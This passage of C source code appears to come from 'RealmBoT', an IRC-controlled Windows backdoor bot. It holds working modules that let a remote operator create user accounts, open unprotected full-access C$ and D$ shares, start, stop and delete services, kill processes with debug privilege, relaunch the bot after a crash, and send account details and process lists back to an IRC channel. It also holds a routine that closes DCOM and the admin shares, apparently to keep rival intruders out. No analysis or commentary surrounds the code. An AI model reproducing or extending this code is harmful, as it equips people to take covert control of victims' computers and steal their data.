	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{

	// do some clean-up
	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);

	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	

	char botfile[MAX_PATH],windir[MAX_PATH];
	GetWindowsDirectory(windir, sizeof(windir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, windir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	// Change EAX in the context record so that it points to someplace
	// where we can successfully write
	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	// Tell the OS to restart the faulting instruction
	return ExceptionContinueExecution;
}
#endif


#ifndef NO_IDENT

DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[IRCLINE];

	int threadnum = (int)param;
	BOOL success = FALSE;

	SOCKET ssock,csock;

	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)113);
	ssin.sin_addr.s_addr=INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);

				while (1) {
					if ((csock = faccept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;

					sprintf(buffer, "RealmBoT (identd.p.l.g) .»».  Client connection from IP: %s:%d.", finet_ntoa(csin.sin_addr), csin.sin_port);
					addlog(buffer);

					if (frecv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);

						memset(user, 0, sizeof(user));
						_snprintf(buffer,sizeof(buffer)," : USERID : UNIX : %s\r\n",rndnick(user, LETTERNICK, FALSE));

						if (fsend(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;

					}
				}
			}
		}
	}

	if (!success) {
		sprintf(buffer, "RealmBoT (identd.p.l.g) .»».  Error: server failed, returned: <%d>.", fWSAGetLastError());
		addlog(buffer);
	}

	fclosesocket(ssock);
	fclosesocket(csock);
	clearthread(threadnum);

	ExitThread(0);
}
#endif


#ifndef NO_NET
// globals
NetCommand netcommand[]={
	{"Add","Added",0},
	{"Delete","Deleted", 0},
	{"List","Listed", 0},
	{"Start","Started", 0},
	{"Stop","Stopped", SERVICE_CONTROL_STOP},
	{"Pause","Paused", SERVICE_CONTROL_PAUSE},
	{"Continue","Continued", SERVICE_CONTROL_CONTINUE}
};

char *Services(int action, char *ServiceName)
{
	static char buffer[IRCLINE];

	if (ServiceName) {
		DWORD svcError = ServiceControl(action, ServiceName, netcommand[action].control);
		if (svcError == 0)
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s service: '%s'.", netcommand[action].completed, ServiceName);
		else
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  Error with service: '%s'. %s", ServiceName, ServiceError(svcError));
	}
	else
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s: No service specified.", netcommand[action].action);

	return (buffer);
}

DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl, DWORD nArg, LPCTSTR *pArg)
{
	DWORD svcError=0;
	SERVICE_STATUS status;

	SC_HANDLE schSCManager = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == 0)
		svcError = GetLastError();
	else {
		SC_HANDLE schService = fOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (schService == 0)
			svcError = GetLastError();
		else {
			switch (option) {
			case NET_START:
				if (!fStartService(schService,nArg,pArg))
					svcError = GetLastError();
				break;
			case NET_DELETE:
				if (!fDeleteService(schService))
					svcError = GetLastError();
				break;
			case NET_STOP:
			case NET_PAUSE:
			case NET_CONTINUE:
				if (!fControlService(schService,dwControl,&status))
					svcError = GetLastError();
				break;
			default:
				break;
			}
			fCloseServiceHandle(schService);
		}
		fCloseServiceHandle(schSCManager);
	}

	return (svcError);
}

static char *ServiceError(DWORD svcError)
{
	static char retError[90];

	switch (svcError) {
	case ERROR_DATABASE_DOES_NOT_EXIST:
		sprintf(retError,"The specified database does not exist.");
		break;
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"The handle does not have the required access right.");
		break;
	case ERROR_INVALID_NAME:
		sprintf(retError,"The specified service name is invalid.");
		break;
	case ERROR_INVALID_HANDLE:
		sprintf(retError,"The handle is invalid.");
		break;
	case ERROR_PATH_NOT_FOUND:
		sprintf(retError,"The service binary file could not be found.");
		break;
	case ERROR_SERVICE_ALREADY_RUNNING:
		sprintf(retError,"An instance of the service is already running.");
		break;
	case ERROR_SERVICE_DATABASE_LOCKED:
		sprintf(retError,"The database is locked.");
		break;
	case ERROR_SERVICE_DEPENDENCY_DELETED:
		sprintf(retError,"The service depends on a service that does not exist or has been marked for deletion.");
		break;
	case ERROR_SERVICE_DEPENDENCY_FAIL:
		sprintf(retError,"The service depends on another service that has failed to start.");
		break;
	case ERROR_SERVICE_DISABLED:
		sprintf(retError,"The service has been disabled.");
		break;
	case ERROR_SERVICE_DOES_NOT_EXIST:
		sprintf(retError,"The specified service does not exist.");
		break;
	case ERROR_SERVICE_LOGON_FAILED:
		sprintf(retError,"The service could not be logged on. The account does not have the correct access rights.");
		break;
	case ERROR_SERVICE_MARKED_FOR_DELETE:
		sprintf(retError,"The service has been marked for deletion.");
		break;
	case ERROR_SERVICE_NO_THREAD:
		sprintf(retError,"A thread could not be created for the service.");
		break;
	case ERROR_SERVICE_REQUEST_TIMEOUT:
		sprintf(retError,"The process for the service was started, but it did not call StartServiceCtrlDispatcher.");
		break;
	case ERROR_DEPENDENT_SERVICES_RUNNING:
		sprintf(retError,"The service cannot be stopped because other running services are dependent on it.");
		break;
	case ERROR_INVALID_PARAMETER:
		sprintf(retError,"The requested control code is undefined.");
		break;
	case ERROR_INVALID_SERVICE_CONTROL:
		sprintf(retError,"The requested control code is not valid, or it is unacceptable to the service.");
		break;
	case ERROR_SERVICE_CANNOT_ACCEPT_CTRL:
		sprintf(retError,"The requested control code cannot be sent to the service because the state of the service.");
		break;
	case ERROR_SERVICE_NOT_ACTIVE:
		sprintf(retError,"The service has not been started.");
		break;
	case ERROR_SHUTDOWN_IN_PROGRESS:
		sprintf(retError,"The system is shutting down.");
		break;
	default:
		sprintf(retError,"An unknown error occurred: <%ld>", svcError);
	}

	return (retError);

}

BOOL ListServices(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], svcState[20];

	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;

	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	irc_privmsg(sock,chan,"The following Windows services are registered:",notice);

	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			switch (enumeration[i].ServiceStatus.dwCurrentState) {
			case SERVICE_STOPPED:
				sprintf(svcState,"    Stopped");
				break;
			case SERVICE_START_PENDING:
				sprintf(svcState,"   Starting");
				break;
			case SERVICE_STOP_PENDING:
				sprintf(svcState,"    Stoping");
				break;
			case SERVICE_RUNNING:
				sprintf(svcState,"    Running");
				break;
			case SERVICE_CONTINUE_PENDING:
				sprintf(svcState," Continuing");
				break;
			case SERVICE_PAUSE_PENDING:
				sprintf(svcState,"    Pausing");
				break;
			case SERVICE_PAUSED:
				sprintf(svcState,"     Paused");
				break;
			default:
				sprintf(svcState,"    Unknown");
				break;
			}
			sprintf(buffer,"%s: %s (%s)", svcState, enumeration[i].lpServiceName, enumeration[i].lpDisplayName);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle);

	if(servicesreturned<=0)
		return FALSE;

	return TRUE;
}

char *Shares(int action, char *ShareName, char *SharePath)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (ShareName) {
		switch (action) {
		case NET_ADD:
			if(SharePath || strchr(ShareName,'$'))
				nStatus = ShareAdd(NULL,ShareName,SharePath);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = ShareDel(NULL, ShareName);
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s share: '%s'.", netcommand[action].completed, ShareName);
		else
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s: Error with share: '%s'. %s", netcommand[action].action, ShareName, NasError(nStatus));
	}
	else
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s: No share specified.", netcommand[action].action);

	return (buffer);
}

static char *AsWideString(const char *cszANSIstring)
{
	if(cszANSIstring == NULL)
		return NULL;

	int nBufSize = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, NULL, 0);
	WCHAR *wideString = new WCHAR[nBufSize+1];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, wideString, nBufSize);

	return reinterpret_cast<char*>(wideString);
}

char *AsAnsiString(const WCHAR *cszWIDEstring)
{
	if(cszWIDEstring == NULL)
		return NULL;

	int nBufSize = WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, NULL, 0, NULL, NULL);
	static char* ansiString = new char[nBufSize+1];
	WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, ansiString, nBufSize, NULL, NULL);

	return reinterpret_cast<char*>(ansiString);
}

NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath)
{
	SHARE_INFO_2 pBuf; // NT only
	DWORD parm_err;

	// Assign values to the SHARES_INFO_2 structure.
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	pBuf.shi2_netname = (LPWSTR)AsWideString(ShareName);
	if (strchr(ShareName, '$'))
		pBuf.shi2_type = STYPE_SPECIAL; // $c, $d, $ipc, $admin
	else
		pBuf.shi2_type = STYPE_DISKTREE; // anything else
	pBuf.shi2_remark = NULL; // No share comment
	pBuf.shi2_permissions = ACCESS_ALL;
	pBuf.shi2_max_uses = -1; // Unlimited
	pBuf.shi2_current_uses = 0;
	pBuf.shi2_path = (LPWSTR)AsWideString(SharePath);
	pBuf.shi2_passwd = NULL; // No password

	// level must be 2 for NT, otherwise it's 50 on 9x (but who cares ;)
	NET_API_STATUS nStatus = fNetShareAdd(wServerName, 2, (LPBYTE)&pBuf, &parm_err);

	return (nStatus);
}

NET_API_STATUS ShareDel(char *ServerName, char *ShareName)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wShareName = (LPWSTR)AsWideString(ShareName);

	NET_API_STATUS nStatus = fNetShareDel(wServerName,wShareName,0);

	return (nStatus);
}

BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{
	char buffer[IRCLINE];

	PSHARE_INFO_502 pBuf,p;
	NET_API_STATUS nStatus;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD entriesread=0,totalread=0,resume=0;

	irc_privmsg(sock,chan,"Share name:    Resource:                Uses:  Desc:",notice);

	do {
		nStatus = fNetShareEnum(wServerName, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

		if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
			p = pBuf;

			for(unsigned int i=1;i <= entriesread;i++) {
	            sprintf(buffer,"%-14S %-24S %-6u %-4s",p->shi502_netname, p->shi502_path, p->shi502_current_uses, IsVSD(fIsValidSecurityDescriptor(p->shi502_security_descriptor)));
				irc_privmsg(sock,chan,buffer,notice,TRUE);

				p++;
			}

			fNetApiBufferFree(pBuf);
		} else {
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  Share list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}
	} while (nStatus == ERROR_MORE_DATA);

	if(nStatus != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (Username) {
		switch (action) {
		case NET_ADD:
			if(Username && Password)
				nStatus = UserAdd(NULL,Username,Password);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = UserDel(NULL, Username);
			break;
		case NET_INFO:
			nStatus = UserInfo(NULL,Username,sock,chan,notice);
			break;
		default:
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s username: '%s'.", netcommand[action].completed, Username);
		else
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s: Error with username: '%s'. %s", netcommand[action].action, Username, NasError(nStatus));
	}
	else
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s: No username specified.", netcommand[action].action);

	return (buffer);
}

NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password)
{
	USER_INFO_1 ui;
	DWORD dwLevel = 1, dwError = 0;

	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	ui.usri1_name = (LPWSTR)AsWideString(Username);
	ui.usri1_password = (LPWSTR)AsWideString(Password);
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;

	NET_API_STATUS nStatus = fNetUserAdd(wServerName,dwLevel,(LPBYTE)&ui,&dwError);

	return (nStatus);
}

NET_API_STATUS UserDel(char *ServerName, char *Username)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);

	NET_API_STATUS nStatus = fNetUserDel(wServerName,wUsername);

	return (nStatus);
}

NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], *user_priv;

	LPUSER_INFO_11 pBuf = NULL;
	DWORD dwLevel = 11;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);

	NET_API_STATUS nStatus = fNetUserGetInfo(wServerName,wUsername,dwLevel,(LPBYTE *)&pBuf);

	if (nStatus == NERR_Success) {
		if (pBuf != NULL) {
			sprintf(buffer,"Account: %S",pBuf->usri11_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Full Name: %S",pBuf->usri11_full_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User Comment: %S",pBuf->usri11_usr_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Comment: %S",pBuf->usri11_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			switch(pBuf->usri11_priv) {
			case USER_PRIV_GUEST:
				user_priv = TEXT("Guest");
				break;
			case USER_PRIV_USER:
				user_priv = TEXT("User");
				break;
			case USER_PRIV_ADMIN:
				user_priv = TEXT("Administrator");
				break;
			default:
				user_priv = TEXT("Unknown");
				break;
			}
			sprintf(buffer,"Privilege Level: %s",user_priv);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Auth Flags: %d",pBuf->usri11_auth_flags);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Home Directory: %S",pBuf->usri11_home_dir);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Parameters: %S",pBuf->usri11_parms);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Password Age: %d",pBuf->usri11_password_age);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Bad Password Count: %d",pBuf->usri11_bad_pw_count);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Number of Logins: %d",pBuf->usri11_num_logons);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logon: %d",pBuf->usri11_last_logon);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logoff: %d",pBuf->usri11_last_logoff);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Logon Server: %S",pBuf->usri11_logon_server);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Workstations: %S",pBuf->usri11_workstations);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Country Code: %d",pBuf->usri11_country_code);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User's Language: %d",pBuf->usri11_code_page);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Max. Storage: %d",pBuf->usri11_max_storage);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Units Per Week: %d",pBuf->usri11_units_per_week);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}
	else {
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  User info error: <%ld>",nStatus);
		irc_privmsg(sock,chan,buffer,notice);
	}

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	return (nStatus);
}

BOOL ListUsers(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{

	char buffer[IRCLINE];

	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD dwLevel=0,dwPrefMaxLen=MAX_PREFERRED_LENGTH,dwEntriesRead=0,
		dwTotalEntries=0,dwResumeHandle=0,dwTotalCount=0;
	NET_API_STATUS nStatus;

	irc_privmsg(sock,chan,"Username accounts for local system:",notice);

	do {
		nStatus = fNetUserEnum(wServerName,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,
			dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((pTmpBuf = pBuf) != NULL) {
				for (DWORD i = 0;i < dwEntriesRead; i++) {
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL) {
						sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  An access violation has occured.");
						irc_privmsg(sock,chan,buffer,notice);
						break;
					}

					sprintf(buffer,"  %S",pTmpBuf->usri0_name);
					irc_privmsg(sock,chan,buffer,notice,TRUE);

					pTmpBuf++;
					dwTotalCount++;
				}
			}
		} else {
			sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  User list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}

		if (pBuf != NULL) {
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	sprintf(buffer,"Total users found: %d.",dwTotalCount);
	irc_privmsg(sock,chan,buffer,notice);

	if(nStatus != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

static char *NasError(NET_API_STATUS nStatus)
{
	static char retError[90];

	switch (nStatus) {
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"Access denied.");
		break;
	case ERROR_INVALID_LEVEL:
		sprintf(retError,"Level parameter is invalid.");
		break;
	case ERROR_INVALID_NAME:
		sprintf(retError,"The name is invalid.");
		break;
	case ERROR_INVALID_PARAMETER:
		sprintf(retError,"Invalid parameter.");
		break;
	case ERROR_NOT_ENOUGH_MEMORY:
		sprintf(retError,"Not enough memory.");
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(retError,"This network request is not supported.");
		break;
	case ERROR_BAD_NETPATH:
		sprintf(retError,"Server name not found.");
		break;
	case NERR_NetNameNotFound:
		sprintf(retError,"Share not found.");
		break;
	case NERR_DuplicateShare:
		sprintf(retError,"Duplicate share name.");
		break;
	case NERR_RedirectedPath:
		sprintf(retError,"Invalid for redirected resource.");
		break;
	case NERR_UnknownDevDir:
		sprintf(retError,"Device or directory does not exist.");
		break;
	case NERR_InvalidComputer:
		sprintf(retError,"The computer name is invalid.");
		break;
	case NERR_NotPrimary:
		sprintf(retError,"The operation is allowed only on the primary domain controller of the domain.");
		break;
	case NERR_GroupExists:
		sprintf(retError,"The group already exists.");
		break;
	case NERR_UserExists:
		sprintf(retError,"The user account already exists.");
		break;
	case NERR_PasswordTooShort:
		sprintf(retError,"The password is shorter than required (or does not meet the password policy requirement.)");
		break;
	case NERR_UseNotFound:
		sprintf(retError,"Network connection not found.");
		break;
	case NERR_NetworkError:
		sprintf(retError,"A general failure occurred in the network hardware.");
		break;
	case NERR_NameNotFound:
	case NERR_UserNotFound:
		sprintf(retError,"The user name could not be found.");
		break;
	default:
		sprintf(retError,"An unknown error occurred.");
		break;
	}

	return (retError);
}

char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];

	wchar_t wserver[MAX_PATH+4], wmsg[IRCLINE];
	mbstowcs(wmsg, msg, IRCLINE);

	char Server[MAX_PATH+4];
	DWORD szServer = sizeof(Server);
	GetComputerName(Server, &szServer);
	mbstowcs(wserver, Server, MAX_PATH+4);

	NET_API_STATUS nStatus = fNetMessageBufferSend(NULL, wserver, NULL, (LPBYTE)&wmsg, wcslen(wmsg)*2);

	if(nStatus == NERR_Success)
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  Message sent successfully.");
	else
		sprintf(buffer,".t.rn(01a) [net.m.d.l] .»».  %s <Server: %S> <Message: %S>", NasError(nStatus), wserver, wmsg);

	return (buffer);
}
#endif

#ifndef NO_PROCESS

// globals



BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1;
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);

	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};

	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				}
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"RealmBoT (processes.p.l.g) .»».  Listing processes:");
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);

	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"RealmBoT (processes.p.l.g) .»».  Process list completed.");
	else
		sprintf(sendbuf,"RealmBoT (processes.p.l.g) .»».  Process list failed.");

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;

	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}


#endif


#ifndef NO_SECSYSTEM
int secure_delay=120000;
#endif

NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"}
};


DWORD WINAPI SecureThread(LPVOID param)
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey;
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="N";
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Disable DCOM failed.");
			else
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  DCOM disabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000001;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to restrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Restricted access to the IPC$ Share.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to open IPC$ Restriction registry key.");
	} else
		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;

		do {
			nStatus = fNetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				p = pBuf;

				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
						if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Share '%S' deleted.",p->shi502_netname);
						else
							_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);
					}

					p++;
				}

				fNetApiBufferFree(pBuf);
			} else {
